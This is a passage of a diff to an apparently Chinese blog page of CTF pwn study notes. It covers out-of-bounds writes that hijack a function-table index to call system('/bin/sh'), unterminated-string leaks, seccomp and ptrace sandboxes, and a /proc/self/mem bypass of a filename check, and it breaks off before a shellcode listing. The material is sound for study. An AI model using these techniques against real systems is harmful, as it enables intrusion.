+<li>加载器将这些短从ELF文件复制到响应虚拟内存地址，通过页表建立虚拟和物理内存地址映射关系</li>
+</ul>
 <h2 id="终端处理">终端处理</h2>
 <p>① 只有<code>echo</code>命令</p>
 <div class="highlight"><div class="chroma">
@@ -2740,7 +3018,51 @@
 </table></div>
 <p>【<strong>调试方法</strong>】</p>
 <p>根据相应汇编看寄存器的变化值，然后逆向使用python进行相反运算获取对应十六进制值再转换为十进制，最终可以根据调试构造出所需要的size大小，进而若有可控制的数组偏移如下，即可利用更改内存值</p>
-<h2 id="栈溢出漏洞">栈溢出漏洞</h2>
+<h2 id="oob漏洞">OOB漏洞</h2>
+<p>Out-of-Bounds，包括数组越界、指针偏移、使用后释放UAF等</p>
+<p><strong>写后判断</strong></p>
+<p>通过该漏洞可以造成越界写内容，若arg_list在bss段可以借此<strong>越界改其他bss段上的变量</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">next_args</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">);</span> <span class="c1">// 获取命令行输入参数遍历
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">next_args</span> <span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="n">next_args</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">31</span> <span class="p">){</span><span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">nargs</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">arg_list</span><span class="p">[</span><span class="mi">32</span> <span class="o">*</span> <span class="n">i</span><span class="p">],</span> <span class="n">next_args</span><span class="p">);</span> <span class="c1">// 漏洞点: 先写入arg_list再判断是否大于10
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="n">nargs</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="p">){</span> <span class="k">return</span> <span class="n">idx</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span><span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>调用越界</strong></p>
+<ul>
+<li>先任意写入system地址到bss段，尝试越界修改bss段中idx使得偏移调用system函数</li>
+<li><code>arg_list</code>也可尝试任意地址写入<code>'/bin/sh'</code></li>
+<li>注意有时<code>p64(0xab)</code>时使用<code>replace(b'\x00', b'')</code>或<code>p64(0x123456781234)[:6]</code>替换防止提前0截断</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">funcs_list</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="n">idx</span><span class="p">))(</span><span class="n">arg_list</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="栈溢出漏洞">栈溢出漏洞</h2>
 <h3 id="栈基础">栈基础</h3>
 <p>函数调用栈在内存中<strong>从高地址向低地址生长</strong>，所以栈顶对应内存地址压栈时变小，退栈时变大</p>
 <p><img src="/img/pwn_note.zh-cn.assets/-17284464998305.assets"
@@ -2852,6 +3174,23 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40uLL</span><span class="p">);</span> <span class="c1">// 末尾不为0则打印出后续内容
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>无截断泄露</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">len</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">input</span><span class="o">+</span><span class="n">len</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span> <span class="c1">// 最后一个值不传入\n
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="o">*</span><span class="p">(</span><span class="n">input</span><span class="o">+</span><span class="n">len</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">command_name</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">command_name</span><span class="p">);</span> <span class="c1">// 结尾无\0截断可泄露后续栈地址或进程基址或libc[_IO_2_1_stderr_]地址
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="ret2text">ret2text</h3>
 <ul>
@@ -3334,7 +3673,495 @@
 <li><code>libc</code>的<code>bss</code>段，将<code>libc</code>放入<code>IDA</code>中查看即可</li>
 <li><code>__free_hook </code>，<code>__free_hook</code>是<strong>全局变量</strong>，可直接被修改</li>
 </ol>
-<h2 id="rop">ROP</h2>
+<h2 id="沙箱sandbox">沙箱Sandbox</h2>
+<p>限制execve导致不能使用onegadget和system调用，一般两种方式开启沙箱</p>
+<ul>
+<li>采用prctl函数调用</li>
+<li>使用seccomp库函数</li>
+</ul>
+<p><strong>seccomp</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">v</span> <span class="o">=</span> <span class="n">seccomp_init</span><span class="p">(</span><span class="mi">111LL</span><span class="p">);</span> <span class="c1">// 初始化，参数表示用于过滤的操作模式
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">59LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span> <span class="c1">// 禁用59系统调用号execve
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">seccomp_load</span><span class="p">(</span><span class="n">v</span><span class="p">);</span> <span class="c1">// 加载过滤器
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>绕过</strong>：查看ret2syscall中orw bypass</p>
+<h3 id="proc泄露">/proc泄露</h3>
+<ul>
+<li>保护全开，提供<code>open</code>，<code>read</code>，<code>write</code>，<code>lseek</code>函数</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nl">open</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">O_RDONLY</span>        <span class="mo">00000000</span>
+</span></span><span class="line"><span class="cl"><span class="n">O_WRONLY</span>        <span class="mo">00000001</span>
+</span></span><span class="line"><span class="cl"><span class="n">O_RDWR</span>          <span class="mo">00000002</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><strong>lseek</strong>函数：在文件中移动文件指针的位置</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">off_t</span> <span class="nf">lseek</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">off_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">int</span> <span class="n">whence</span><span class="p">);</span><span class="c1">// 返回文件指针偏移值 或 -1
+</span></span></span><span class="line"><span class="cl"><span class="c1">// fd: 文件描述符   offset: 相对于whence的偏移量   
+</span></span></span><span class="line"><span class="cl"><span class="c1">// whence: 文件指针基准位置【SEEK_SET 0 开头, SEEK_CUR 1 当前, SEEK_END 2 结尾】
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>/proc 文件系统</strong></p>
+<ol>
+<li>Linux内核提供的一种<strong>伪</strong>文件系统，运行时可访问、设置内核内部数据结构，只存在内存中，不占外存空间</li>
+<li><code>/proc/self/maps</code>: 得到当前进程内存映射关系，等价于pwndbg中的<code>vmmap</code>，open只可读，<strong>可获取内存代码段基址</strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x555555554000</span>     <span class="mh">0x555555555000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">zhou</span><span class="o">/</span><span class="n">pwn</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 0x555555554000 即为文件基址
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>/proc/self/mem</code>: 进程内存内容，open可读可写，修改该文件等效于直接修改当前进程内存</li>
+</ul>
+<p><img src="/img/pwn_note.zh-cn.assets/-172844670575243.assets"
+	
+	
+	
+	loading="lazy"
+	
+		alt="img"
+	
+	
+></p>
+<p><strong>绕过利用</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// open时文件包含flag将会报错
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span> <span class="n">strstr</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">)</span> <span class="p">){</span> <span class="c1">// filename中查找第一次出现&#34;flag&#34;的位置
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// IDA
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">.</span><span class="nl">rodata</span><span class="p">:</span><span class="mo">000000000000216</span><span class="n">C</span> <span class="n">needle</span>          <span class="n">db</span> <span class="err">&#39;</span><span class="n">flag</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0</span>             <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">Open</span><span class="o">+</span><span class="mi">4</span><span class="n">D</span><span class="err">↑</span><span class="n">o</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>通过打开<code>/proc/self/maps</code>文件泄露基址，IDA中确定字符串偏移</p>
+</li>
+<li>
+<p>用lseek修改文件指针进行读取修改，写入<code>/proc/self/mem</code>将&rsquo;flag&rsquo;更改为别的字符串绕过检查</p>
+</li>
+</ul>
+<h3 id="ptrace进程">Ptrace进程</h3>
+<p><strong>__WAIT_STATUS</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// 定义了__WAIT_STATUS [union: 共用同一块内存,兼容系统]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">typedef</span> <span class="k">union</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 都用于表示进程状态
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">union</span> <span class="n">wait</span> <span class="o">*</span><span class="n">__uptr</span><span class="p">;</span> <span class="c1">// 早期系统 指向 union wait 类型的指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="o">*</span><span class="n">__iptr</span><span class="p">;</span>        <span class="c1">// 现代系统 指向        int 类型的指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="n">__WAIT_STATUS</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">__transparent_union__</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// IDA 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">__WAIT_STATUS</span> <span class="n">stat_loc</span><span class="p">;</span> <span class="c1">// 存储进程状态的变量 用于判断进程是否在系统调用的标志
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">HIDWORD</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">.</span><span class="n">__iptr</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// iptr指针指向的地址(64位)的高32位置为0 对应源码 int in_syscall = 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">wait</span><span class="p">((</span><span class="n">__WAIT_STATUS</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stat_loc</span><span class="p">);</span> <span class="c1">// 父进程等待子进程系统调用, 状态存储在stat_loc
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">stat_loc</span><span class="p">.</span><span class="n">__uptr</span> <span class="o">&amp;</span> <span class="mh">0xB00</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xB00</span> <span class="p">)</span> <span class="c1">// __uptr 对应源码的 int status
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Linux 进程状态码 以宏解读: -&gt; 判断是否遇到段错误
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 0x100：子进程被跟踪 (ptraced)
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 0x200：子进程遇到一个致命信号（如段错误）
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 0x800：子进程在执行系统调用时发生错误
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="n">LOBYTE</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">.</span><span class="n">__uptr</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">127</span> <span class="c1">// LOBYTE获取低8位, 127为 wait(pid) pid标识的命令未知的退出状态值
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>fork</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">v</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span> <span class="c1">// 子进程中返回0，父进程中返回子进程的PID
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">v</span> <span class="o">&amp;</span> <span class="mh">0x80000000</span> <span class="o">!=</span> <span class="mi">0</span> <span class="c1">// 判断 v 有符号数的最高位是否为1，为1则为负数，为0则为正数，判断v是否为负数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">v</span><span class="p">)</span> <span class="p">{}</span>  <span class="c1">// 进入子进程
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>ptrace：断点调试和系统调用跟踪</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// 一个进程可观察和控制另一个进程的执行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ptrace</span><span class="p">(</span><span class="k">enum</span> <span class="n">__ptrace_request</span> <span class="n">op</span><span class="p">,</span> <span class="n">pid_t</span> <span class="n">pid</span><span class="p">,</span><span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">v1</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span> <span class="c1">// 指示该进程由父进程跟踪, 后续参数忽略
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">v1</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_ATTACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span> <span class="c1">// 跟踪调试指定pid进程, 此时子进程等待, 父进程可使用ptrace调试
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SYSCALL</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span> <span class="c1">// 重新启动停止的子进程 or 挂起子进程，直到子进程发出系统调用，父进程拦截处理
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_KILL</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span> <span class="c1">// 杀掉子进程
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="n">vg</span><span class="p">);</span> <span class="c1">// 获取子进程寄存器状态, 内容存在vg中
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 源码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">rax</span> <span class="o">=</span> <span class="n">regs</span><span class="p">.</span><span class="n">orig_rax</span><span class="p">;</span>  <span class="c1">// IDA中源码将显示 v13 = v26等 需要判断
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">rdi</span><span class="o">=</span><span class="n">regs</span><span class="p">.</span><span class="n">rdi</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">rsi</span><span class="o">=</span><span class="n">regs</span><span class="p">.</span><span class="n">rsi</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">rdx</span><span class="o">=</span><span class="n">regs</span><span class="p">.</span><span class="n">rdx</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">rcx</span><span class="o">=</span><span class="n">regs</span><span class="p">.</span><span class="n">rcx</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">rip</span><span class="o">=</span><span class="n">regs</span><span class="p">.</span><span class="n">rip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="n">vg</span><span class="p">);</span> <span class="c1">// 设置子进程pid的寄存器值为vg内容
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>例子：NepCTF2024——NepBox</strong></p>
+<ul>
+<li><strong>子进程</strong>：前提mmap了一段地址0xDEAD000，这段空间不仅可以布置shellcode，还可以在更高的地方存放泄露的flag内容，可以向该地址写入shellcode，且会由子进程执行</li>
+<li><strong>父进程</strong>：会在子进程调用系统调用前拦截并对系统调用运用<strong>白名单</strong>处理，，采用open，read，write到stdout获取flag值</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">case</span> <span class="nl">__NR_openat</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">permission</span><span class="o">=</span><span class="n">rdx</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">OpenFile</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="nl">__NR_open</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">permission</span><span class="o">=</span><span class="n">rsi</span><span class="p">;</span> <span class="c1">// rsi != 1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">OpenFile</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">permission</span><span class="p">){</span> 
+</span></span><span class="line"><span class="cl">        <span class="n">ExitAndKillPid</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="nl">__NR_read</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;read(%d,%p,0x%x);</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">rdi</span><span class="p">,</span><span class="n">rsi</span><span class="p">,</span><span class="n">rdx</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="nl">__NR_write</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">choice</span><span class="o">=</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="n">number</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">regs</span><span class="p">.</span><span class="n">rsi</span><span class="o">=</span><span class="n">say</span><span class="p">[</span><span class="n">choice</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">regs</span><span class="p">.</span><span class="n">rdx</span><span class="o">=</span><span class="n">strlen</span><span class="p">(</span><span class="n">say</span><span class="p">[</span><span class="n">choice</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span> <span class="c1">// 会更改rsi和rdx，flag输出换为其他内容
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">break</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>汇编编写open, read, write shellcode+基于时间的盲注</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
